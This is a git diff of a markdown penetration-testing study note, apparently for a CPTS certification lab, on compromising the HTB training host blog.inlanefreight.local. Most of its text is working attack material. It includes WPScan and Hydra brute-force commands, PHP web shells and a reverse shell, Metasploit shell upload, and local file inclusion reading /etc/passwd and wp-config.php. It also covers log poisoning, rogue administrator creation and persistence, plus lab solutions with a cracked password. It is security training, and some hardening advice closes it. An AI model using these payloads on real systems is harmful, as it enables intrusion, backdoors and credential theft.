@@ -7,28 +7,31 @@
 After completing WordPress enumeration, we move to the exploitation phase. WordPress presents multiple attack vectors including credential-based attacks, theme manipulation, plugin vulnerabilities, and core exploits. This section covers systematic approaches to gaining initial access and escalating privileges.
 
 **Attack Categories:**
-- **🔐 Authentication Attacks** - Brute force and credential compromise
-- **💻 Code Execution** - Theme editor manipulation and file upload bypasses
-- **🔧 Automated Exploitation** - Metasploit and framework-based attacks
-- **🎯 Plugin Vulnerabilities** - CVE exploitation and zero-day techniques
 
----
+* **🔐 Authentication Attacks** - Brute force and credential compromise
+* **💻 Code Execution** - Theme editor manipulation and file upload bypasses
+* **🔧 Automated Exploitation** - Metasploit and framework-based attacks
+* **🎯 Plugin Vulnerabilities** - CVE exploitation and zero-day techniques
+
+***
 
 ## Prerequisites
 
 Before proceeding with attacks, ensure completion of:
-1. **[WordPress Discovery & Enumeration](wordpress-discovery-enumeration.md)** - Target reconnaissance
+
+1. [**WordPress Discovery & Enumeration**](wordpress-discovery-enumeration.md) - Target reconnaissance
 2. **Valid user accounts identified** - Username enumeration results
 3. **Plugin versions documented** - Vulnerability research completed
 4. **WordPress version confirmed** - Core exploit mapping
 
----
+***
 
 ## Authentication Attacks
 
 ### Login Brute Force with WPScan
 
 #### XML-RPC Method (Preferred)
+
 ```bash
 # Fast XML-RPC brute force attack
 wpscan --password-attack xmlrpc \
@@ -44,6 +47,7 @@ wpscan --password-attack xmlrpc \
 ```
 
 #### Traditional wp-login Method
+
 ```bash
 # Standard login page brute force
 wpscan --password-attack wp-login \
@@ -56,6 +60,7 @@ wpscan --password-attack wp-login \
 ```
 
 #### Targeted User Attack
+
 ```bash
 # Focus on specific user with custom wordlist
 wpscan --password-attack xmlrpc \
@@ -74,6 +79,7 @@ wpscan --password-attack xmlrpc \
 ### Manual Brute Force Techniques
 
 #### Custom Login Attack Scripts
+
 ```bash
 #!/bin/bash
 # manual-wp-brute.sh - Custom WordPress brute force
@@ -95,6 +101,7 @@ done < "$wordlist"
 ```
 
 #### Hydra Integration
+
 ```bash
 # Alternative brute force with Hydra
 hydra -l john -P /usr/share/wordlists/rockyou.txt \
@@ -102,13 +109,14 @@ hydra -l john -P /usr/share/wordlists/rockyou.txt \
   "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password for username"
 ```
 
----
+***
 
 ## Code Execution Techniques
 
 ### Theme Editor Exploitation
 
 #### Step 1: Administrative Access Required
+
 ```bash
 # Prerequisites:
 # - Valid admin/editor credentials
@@ -117,6 +125,7 @@ hydra -l john -P /usr/share/wordlists/rockyou.txt \
 ```
 
 #### Step 2: Theme Selection Strategy
+
 ```bash
 # Target inactive themes to avoid site disruption
 # Common inactive themes:
@@ -131,6 +140,7 @@ curl -s http://blog.inlanefreight.local | grep themes | head -1
 #### Step 3: Web Shell Injection
 
 **Simple Command Execution:**
+
 ```php
 <?php
 // Add to 404.php or footer.php
@@ -139,6 +149,7 @@ system($_GET['cmd']);
 ```
 
 **Advanced PHP Web Shell:**
+
 ```php
 <?php
 // Multi-functional web shell
@@ -168,6 +179,7 @@ if(isset($_POST['upload'])) {
 ```
 
 #### Step 4: Web Shell Access
+
 ```bash
 # Access web shell through theme path
 curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=id"
@@ -184,6 +196,7 @@ curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?c
 ### Reverse Shell Establishment
 
 #### PHP Reverse Shell
+
 ```php
 <?php
 // Add to theme file for reverse shell
@@ -195,6 +208,7 @@ $proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
 ```
 
 #### Netcat Listener Setup
+
 ```bash
 # Start listener on attacking machine
 nc -nlvp 4444
@@ -203,13 +217,14 @@ nc -nlvp 4444
 curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php"
 ```
 
----
+***
 
 ## Metasploit Exploitation
 
-### wp_admin_shell_upload Module
+### wp\_admin\_shell\_upload Module
 
 #### Module Configuration
+
 ```bash
 # Start Metasploit
 msfconsole
@@ -227,6 +242,7 @@ set LPORT 4444
 ```
 
 #### Module Options Verification
+
 ```bash
 # Verify all settings
 show options
@@ -241,6 +257,7 @@ show options
 ```
 
 #### Exploitation Execution
+
 ```bash
 # Launch exploit
 exploit
@@ -262,6 +279,7 @@ pwd
 ### Meterpreter Post-Exploitation
 
 #### System Information Gathering
+
 ```bash
 # Meterpreter commands for reconnaissance
 sysinfo                    # System information
@@ -272,6 +290,7 @@ route                      # Network routes
 ```
 
 #### File System Exploration
+
 ```bash
 # Navigate and explore
 pwd                        # Current directory
@@ -281,13 +300,14 @@ download flag.txt         # Download files
 search -f config.php      # Find configuration files
 ```
 
----
+***
 
 ## Plugin Vulnerability Exploitation
 
 ### mail-masta Plugin LFI
 
 #### Vulnerability Analysis
+
 ```php
 // Vulnerable code in mail-masta plugin
 <?php 
@@ -297,6 +317,7 @@ include($_GET['pl']);
 ```
 
 #### Local File Inclusion Exploitation
+
 ```bash
 # Basic LFI attack
 curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
@@ -308,6 +329,7 @@ curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campa
 ```
 
 #### WordPress Configuration Disclosure
+
 ```bash
 # Extract WordPress configuration
 curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../wp-config.php"
@@ -320,6 +342,7 @@ curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campa
 ```
 
 #### Log Poisoning Attack
+
 ```bash
 # Poison access logs via User-Agent
 curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
@@ -332,6 +355,7 @@ curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campa
 ### wpDiscuz Plugin RCE
 
 #### Vulnerability Overview
+
 ```bash
 # wpDiscuz 7.0.4 - File Upload Bypass (CVE-2020-24186)
 # Allows unauthenticated PHP file upload
@@ -340,6 +364,7 @@ curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campa
 ```
 
 #### Automated Exploitation
+
 ```bash
 # Download exploit script
 wget https://github.com/hevox/CVE-2020-24186/raw/master/wp_discuz.py
@@ -355,6 +380,7 @@ python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"
 ```
 
 #### Manual Web Shell Access
+
 ```bash
 # Access uploaded web shell
 curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id"
@@ -368,13 +394,14 @@ curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxe
 curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=ls+-la"
 ```
 
----
+***
 
 ## Advanced Attack Techniques
 
 ### WordPress Core Exploits
 
 #### Version-Specific Attacks
+
 ```bash
 # Check WordPress version vulnerabilities
 searchsploit wordpress 5.8
@@ -388,6 +415,7 @@ searchsploit wordpress core
 ```
 
 #### XML-RPC Abuse
+
 ```bash
 # XML-RPC DDoS amplification
 curl -X POST http://blog.inlanefreight.local/xmlrpc.php \
@@ -404,6 +432,7 @@ curl -X POST http://blog.inlanefreight.local/xmlrpc.php \
 ### Database Access Exploitation
 
 #### wp-config.php Credentials
+
 ```bash
 # Extract database credentials from wp-config.php
 # Through LFI or direct file access
@@ -414,6 +443,7 @@ mysql -h localhost -u db_user -p database_name
 ```
 
 #### WordPress Database Manipulation
+
 ```sql
 -- WordPress database tables of interest:
 -- wp_users (user accounts and passwords)
@@ -430,13 +460,14 @@ INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
 VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
 ```
 
----
+***
 
 ## Post-Exploitation Activities
 
 ### Persistence Mechanisms
 
 #### Web Shell Maintenance
+
 ```bash
 # Multiple web shell deployment
 # 1. Theme file modification (404.php, footer.php)
@@ -446,6 +477,7 @@ VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
 ```
 
 #### User Account Creation
+
 ```php
 // PHP script to create WordPress admin user
 <?php
@@ -466,6 +498,7 @@ $user->set_role('administrator');
 ### Data Extraction
 
 #### Sensitive File Collection
+
 ```bash
 # Configuration files
 cat wp-config.php
@@ -481,6 +514,7 @@ find . -name "*.sql" -o -name "*.db" -o -name "*backup*"
 ```
 
 #### WordPress-Specific Intelligence
+
 ```bash
 # Installed plugins and themes
 ls -la wp-content/plugins/
@@ -493,14 +527,16 @@ find wp-content/plugins/ -name "config.php" -o -name "settings.php"
 mysql -e "SELECT user_login, user_email, user_status FROM wp_users;"
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab 1: User Enumeration
+
 **Question:** "Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?"
 
 **Solution:**
+
 ```bash
 # Method 1: WPScan user enumeration
 wpscan --url http://blog.inlanefreight.local --enumerate u
@@ -517,9 +553,11 @@ curl -s "http://blog.inlanefreight.local/wp-json/wp/v2/users" | jq '.[].slug'
 ```
 
 ### Lab 2: Password Brute Force
+
 **Question:** "Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer."
 
 **Solution:**
+
 ```bash
 # WPScan brute force attack
 wpscan --password-attack xmlrpc \
@@ -538,9 +576,11 @@ wpscan --password-attack xmlrpc \
 ```
 
 ### Lab 3: System User Discovery
+
 **Question:** "Using the methods shown in this section, find another system user whose login shell is set to /bin/bash."
 
 **Solution:**
+
 ```bash
 # Exploit mail-masta LFI to read /etc/passwd
 curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" | grep "/bin/bash"
@@ -555,9 +595,11 @@ curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?c
 ```
 
 ### Lab 4: Code Execution and Flag Retrieval
+
 **Question:** "Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot."
 
 **Solution:**
+
 ```bash
 # Method 1: Theme Editor Approach
 # 1. Login to wp-admin with john:firebird1
@@ -585,13 +627,14 @@ cat /var/www/html/flag.txt
 # Expected answer: [FLAG_CONTENT]
 ```
 
----
+***
 
 ## Security Cleanup & Artifacts
 
 ### Post-Engagement Cleanup
 
 #### Files to Remove
+
 ```bash
 # Web shells and backdoors
 rm /wp-content/themes/twentynineteen/404.php.bak
@@ -603,6 +646,7 @@ find /wp-content/plugins/ -name "*random*.php" -delete
 ```
 
 #### Log Evidence
+
 ```bash
 # Access logs showing exploitation attempts
 tail -f /var/log/apache2/access.log | grep -E "(404\.php|count_of_send\.php|xmlrpc\.php)"
@@ -614,6 +658,7 @@ tail -f /var/log/wp-errors.log
 ### Report Documentation
 
 #### Testing Artifacts to Document
+
 ```
 1. Modified theme files:
    - /wp-content/themes/twentynineteen/404.php
@@ -631,11 +676,12 @@ tail -f /var/log/wp-errors.log
    - Modified .htaccess (if applicable)
 ```
 
----
+***
 
 ## Defensive Recommendations
 
 ### Immediate Actions
+
 ```bash
 # Update WordPress core and plugins
 wp core update
@@ -651,6 +697,7 @@ add_filter('xmlrpc_enabled', '__return_false');
 ```
 
 ### Security Hardening
+
 ```bash
 # File permissions
 find /wp-content -type f -exec chmod 644 {} \;
@@ -665,14 +712,15 @@ define('DISALLOW_FILE_EDIT', true);
 remove_action('wp_head', 'wp_generator');
 ```
 
----
+***
 
 ## Next Steps
 
 After WordPress compromise:
-1. **[Privilege Escalation](../privilege-escalation/)** - Escalate from www-data to root
-2. **[Lateral Movement](../lateral-movement/)** - Move to other systems
-3. **[Persistence](../persistence/)** - Maintain long-term access
-4. **[Data Exfiltration](../data-exfiltration/)** - Extract sensitive information
 
-**💡 Key Takeaway:** WordPress attacks often provide initial web application access. Combining enumeration findings with systematic exploitation techniques enables reliable compromise of vulnerable WordPress installations. Always document artifacts and clean up testing evidence during professional engagements. 
+1. [**Privilege Escalation**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/privilege-escalation/README.md) - Escalate from www-data to root
+2. [**Lateral Movement**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/lateral-movement/README.md) - Move to other systems
+3. [**Persistence**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/persistence/README.md) - Maintain long-term access
+4. [**Data Exfiltration**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/data-exfiltration/README.md) - Extract sensitive information
+
+**💡 Key Takeaway:** WordPress attacks often provide initial web application access. Combining enumeration findings with systematic exploitation techniques enables reliable compromise of vulnerable WordPress installations. Always document artifacts and clean up testing evidence during professional engagements.
